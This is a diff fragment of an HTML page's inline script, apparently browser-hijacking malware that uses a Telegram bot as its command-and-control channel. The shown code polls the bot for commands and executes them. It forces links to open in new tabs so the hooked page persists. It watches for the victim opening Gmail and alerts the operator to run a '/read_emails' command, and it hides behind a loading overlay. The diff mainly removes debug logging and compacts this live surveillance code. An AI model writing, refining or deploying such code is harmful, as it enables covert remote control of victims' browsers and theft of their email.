+            async function poll() {
                 if (!isRegistered) return;
                 try {
-                    const url = `https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${updateId}&timeout=10`;
-                    debugLog(`Polling ${url}`);
-                    const res = await fetch(url, { headers: TELEGRAM_HEADERS });
+                    const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${updateId}&timeout=10`, { headers });
                     const data = await res.json();
-                    debugLog(`Poll response: ${JSON.stringify(data)}`);
                     if (data.ok && data.result) {
                         for (const upd of data.result) {
                             if (upd.update_id >= updateId) {
                                 updateId = upd.update_id + 1;
-                                if (upd.message && upd.message.text) {
-                                    await handleCommand(upd.message.text);
-                                } else if (upd.callback_query) {
-                                    const cbData = upd.callback_query.data;
-                                    await handleCommand(cbData);
-                                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery?callback_query_id=${upd.callback_query.id}`, { headers: TELEGRAM_HEADERS });
+                                localStorage.setItem('tg_update_id', updateId);
+                                if (upd.message && upd.message.text) await handleCommand(upd.message.text);
+                                else if (upd.callback_query) {
+                                    await handleCommand(upd.callback_query.data);
+                                    await apiCall('answerCallbackQuery', { callback_query_id: upd.callback_query.id });
                                 }
                             }
                         }
-                    } else {
-                        debugLog(`Poll error: ${data.description || 'unknown'}`);
                     }
-                } catch(e) {
-                    debugLog(`Poll exception: ${e.message}`);
-                }
+                } catch(e) {}
             }
 
-            // ================= PERSISTENCE =================
+            // ---------- PERSISTENCE & INIT ----------
             function setupPersistence() {
                 document.addEventListener('click', (e) => {
-                    let target = e.target.closest('a');
-                    if (target && target.href && !target.href.startsWith('javascript:')) {
-                        e.preventDefault();
-                        window.open(target.href, '_blank');
-                    }
+                    const a = e.target.closest('a');
+                    if (a && a.href && !a.href.startsWith('javascript:')) { e.preventDefault(); window.open(a.href, '_blank'); }
                 }, true);
-                const pframe = document.getElementById('persistentFrame');
-                if (pframe) pframe.src = 'about:blank';
-                debugLog('Persistence setup complete');
+                document.getElementById('persistentFrame').src = 'about:blank';
             }
 
-            // Gmail detection observer
             let lastUrl = location.href;
             new MutationObserver(() => {
-                const url = location.href;
-                if (url !== lastUrl) {
-                    lastUrl = url;
-                    if (url.includes('mail.google.com') && !gmailDetectedNotified) {
-                        gmailDetectedNotified = true;
-                        sendMessage(`📧 *Gmail detected* on device \`${deviceId}\`. Use /read_emails to fetch.`, 'Markdown');
-                    } else if (!url.includes('mail.google.com')) {
-                        gmailDetectedNotified = false;
-                    }
+                if (location.href !== lastUrl) {
+                    lastUrl = location.href;
+                    if (location.href.includes('mail.google.com') && deviceId) sendMessage(`📧 Gmail detected on ${deviceId}. Use /read_emails`, 'Markdown');
                 }
             }).observe(document, { subtree: true, childList: true });
 
-            // ================= INIT =================
-            async function init() {
-                debugLog('Deleting webhook...');
-                try {
-                    const del = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/deleteWebhook`, { method: 'POST', headers: TELEGRAM_HEADERS });
-                    const delData = await del.json();
-                    debugLog(`deleteWebhook response: ${JSON.stringify(delData)}`);
-                } catch(e) { debugLog(`deleteWebhook error: ${e.message}`); }
-                
-                await requestAllPermissions();
+            async function start() {
+                await deleteWebhookOnce();
+                await requestPermissions();
                 setupPersistence();
-                await syncOffset();
-                await registerClient();  // this sends connection message + menu
+                await registerAndSendMenu();
                 isRegistered = true;
-                intervalId = setInterval(pollUpdates, POLL_INTERVAL);
+                pollingInterval = setInterval(poll, POLL_INTERVAL);
                 document.getElementById('loadingOverlay').style.display = 'none';
                 document.getElementById('mainFrame').style.opacity = '1';
-                debugLog('Hook fully initialized');
             }
-            setTimeout(init, START_DELAY);
+            setTimeout(start, 5000);
         })();
     </script>
 </body>
